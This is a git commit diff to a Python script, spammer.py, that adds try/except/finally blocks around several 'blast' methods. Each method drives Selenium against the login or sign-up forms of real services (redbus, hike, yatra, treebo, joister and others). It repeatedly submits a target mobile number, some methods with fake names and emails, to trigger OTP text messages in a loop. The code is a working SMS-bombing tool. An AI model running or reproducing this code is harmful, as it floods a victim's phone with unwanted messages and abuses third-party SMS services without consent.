872f734a5dbb0fc51a82e6464eebe389c7e44abb
FurySwordXD <sainathganesh1@gmail.com>
2018-09-25 13:42:35 +0530

    added exception handling

--- spammer.py
+++ spammer.py
@@ -25,46 +25,56 @@ class Spammer:
         driver.get("https://www.redbus.in/account?pageName=Home&noReload=noReload")
 
         i = 0
-        while self.spam_count < self.bomb_count:
-            mobile_input = driver.find_element_by_id("mobileNoInp")
-            mobile_input.clear()
-            mobile_input.send_keys(self.mobile_no)
+        try:
+            while self.spam_count < self.bomb_count:
+                mobile_input = driver.find_element_by_id("mobileNoInp")
+                mobile_input.clear()
+                mobile_input.send_keys(self.mobile_no)
 
-            element = driver.find_element_by_class_name("otpContainer")
-            driver.execute_script("arguments[0].click();", element)
+                element = driver.find_element_by_class_name("otpContainer")
+                driver.execute_script("arguments[0].click();", element)
 
-            element = driver.find_element_by_class_name("resendOtpContainer")
-            driver.execute_script("arguments[0].click();", element)
+                element = driver.find_element_by_class_name("resendOtpContainer")
+                driver.execute_script("arguments[0].click();", element)
 
-            driver.refresh()
-            self.spam_count += 1
-            i += 1
+                driver.refresh()
+                self.spam_count += 1
+                i += 1
 
-            time.sleep(self.delay)
+                time.sleep(self.delay)
 
-        print(i)
-        driver.close()
+        except Exception as e:
+            print(e)
+
+        finally:
+            print(i)
+            driver.close()
 
     def hike_blast(self):
         driver = webdriver.Chrome(executable_path=Spammer.path, chrome_options=Spammer.chrome_options)
         driver.get("https://hike.in/")
 
         i = 0
-        while self.spam_count < self.bomb_count:
-            mobile_input = driver.find_element_by_id("number-input")
-            mobile_input.clear()
-            mobile_input.send_keys(self.mobile_no)
+        try:
+            while self.spam_count < self.bomb_count:
+                mobile_input = driver.find_element_by_id("number-input")
+                mobile_input.clear()
+                mobile_input.send_keys(self.mobile_no)
 
-            button = driver.find_element_by_xpath("//div[@onclick='sendSMS(this)']")
-            driver.execute_script("arguments[0].click();", button)
+                button = driver.find_element_by_xpath("//div[@onclick='sendSMS(this)']")
+                driver.execute_script("arguments[0].click();", button)
 
-            driver.refresh()
-            self.spam_count += 1
-            i += 1
-            time.sleep(self.delay)
+                driver.refresh()
+                self.spam_count += 1
+                i += 1
+                time.sleep(self.delay)
 
-        print(i)
-        driver.close()
+        except Exception as e:
+            print(e)
+
+        finally:
+            print(i)
+            driver.close()
 
     def biryani_blast(self):
         driver = webdriver.Chrome(executable_path=Spammer.path, chrome_options=Spammer.chrome_options)
@@ -75,110 +85,129 @@ class Spammer:
         email = random_string + "@ggwp.xxx"
 
         i = 0
-        while self.spam_count < self.bomb_count:
-            mobile_input = driver.find_element_by_id("mobileno")
-            mobile_input.clear()
-            mobile_input.send_keys(self.mobile_no)
+        try:
+            while self.spam_count < self.bomb_count:
+                mobile_input = driver.find_element_by_id("mobileno")
+                mobile_input.clear()
+                mobile_input.send_keys(self.mobile_no)
 
-            name_input = driver.find_element_by_id("customer_name")
-            name_input.clear()
-            name_input.send_keys(name)
+                name_input = driver.find_element_by_id("customer_name")
+                name_input.clear()
+                name_input.send_keys(name)
 
-            email_input = driver.find_element_by_id("email_id")
-            email_input.clear()
-            email_input.send_keys(email)
+                email_input = driver.find_element_by_id("email_id")
+                email_input.clear()
+                email_input.send_keys(email)
 
-            button = driver.find_element_by_id("send_otp_register")
-            driver.execute_script("arguments[0].click();", button)
+                button = driver.find_element_by_id("send_otp_register")
+                driver.execute_script("arguments[0].click();", button)
 
-            driver.refresh()
-            self.spam_count += 1
-            i += 1
+                driver.refresh()
+                self.spam_count += 1
+                i += 1
 
-            time.sleep(self.delay)
+                time.sleep(self.delay)
 
-        print(i)
-        driver.close()
+        except Exception as e:
+            print(e)
+
+        finally:
+            print(i)
+            driver.close()
 
     def yatra_blast(self):
         driver = webdriver.Chrome(executable_path=Spammer.path, chrome_options=Spammer.chrome_options)
         driver.get("https://secure.yatra.com/social/common/yatra/register")
 
         i = 0
-        while self.spam_count < self.bomb_count:
-            mobile_input = driver.find_element_by_id("login-input")
-            mobile_input.clear()
-            mobile_input.send_keys(self.mobile_no)
+        try:
+            while self.spam_count < self.bomb_count:
+                mobile_input = driver.find_element_by_id("login-input")
+                mobile_input.clear()
+                mobile_input.send_keys(self.mobile_no)
 
-            button = driver.find_element_by_id("login-continue-btn")
-            driver.execute_script("arguments[0].click();", button)
+                button = driver.find_element_by_id("login-continue-btn")
+                driver.execute_script("arguments[0].click();", button)
 
-            driver.refresh()
-            self.spam_count += 1
-            i += 1
+                driver.refresh()
+                self.spam_count += 1
+                i += 1
 
-            time.sleep(self.delay)
+                time.sleep(self.delay)
+        except Exception as e:
+            print(e)
 
-        print(i)
-        driver.close()
+        finally:
+            print(i)
+            driver.close()
 
     def treebo_blast(self):
         driver = webdriver.Chrome(executable_path=Spammer.path, chrome_options=Spammer.chrome_options)
         driver.get("https://www.treebo.com/login/")
 
         i = 0
-        while self.spam_count < self.bomb_count:
-            mobile_input = driver.find_element_by_id("mobile")
-            mobile_input.clear()
-            mobile_input.send_keys(self.mobile_no)
+        try:
+            while self.spam_count < self.bomb_count:
+                mobile_input = driver.find_element_by_id("mobile")
+                mobile_input.clear()
+                mobile_input.send_keys(self.mobile_no)
 
-            button = driver.find_element_by_id("verify")
-            driver.execute_script("arguments[0].click();", button)
+                button = driver.find_element_by_id("verify")
+                driver.execute_script("arguments[0].click();", button)
 
-            driver.refresh()
-            self.spam_count += 1
-            i += 1
+                driver.refresh()
+                self.spam_count += 1
+                i += 1
 
-            time.sleep(self.delay)
+                time.sleep(self.delay)
 
-        print(i)
-        driver.close()
+        except Exception as e:
+            print(e)
+
+        finally:
+            print(i)
+            driver.close()
 
     def joister_blast(self):
         driver = webdriver.Chrome(executable_path=Spammer.path, chrome_options=Spammer.chrome_options)
         driver.get("https://www.joister.com/")
 
         i = 0
-        while self.spam_count < self.bomb_count:
-            button = driver.find_element_by_id("sign_up")
-            driver.execute_script("arguments[0].click();", button)
+        try:
+            while self.spam_count < self.bomb_count:
+                button = driver.find_element_by_id("sign_up")
+                driver.execute_script("arguments[0].click();", button)
 
-            random_string1 = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=5))
-            random_string2 = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=5))
+                random_string1 = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=5))
+                random_string2 = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=5))
 
-            name_input = driver.find_element_by_id("first_name")
-            name_input.clear()
-            name_input.send_keys(random_string1)
+                name_input = driver.find_element_by_id("first_name")
+                name_input.clear()
+                name_input.send_keys(random_string1)
 
-            name_input = driver.find_element_by_id("last_name")
-            name_input.clear()
-            name_input.send_keys(random_string2)
+                name_input = driver.find_element_by_id("last_name")
+                name_input.clear()
+                name_input.send_keys(random_string2)
 
-            mobile_input = driver.find_element_by_id("mobile_number")
-            mobile_input.clear()
-            mobile_input.send_keys(self.mobile_no)
+                mobile_input = driver.find_element_by_id("mobile_number")
+                mobile_input.clear()
+                mobile_input.send_keys(self.mobile_no)
 
-            button = driver.find_element_by_id("next-step-btn")
-            driver.execute_script("arguments[0].click();", button)
+                button = driver.find_element_by_id("next-step-btn")
+                driver.execute_script("arguments[0].click();", button)
 
-            driver.refresh()
-            self.spam_count += 1
-            i += 1
+                driver.refresh()
+                self.spam_count += 1
+                i += 1
 
-            time.sleep(self.delay)
+                time.sleep(self.delay)
 
-        print(i)
-        driver.close()
+        except Exception as e:
+            print(e)
+
+        finally:
+            print(i)
+            driver.close()
 
     def spam(self):
 
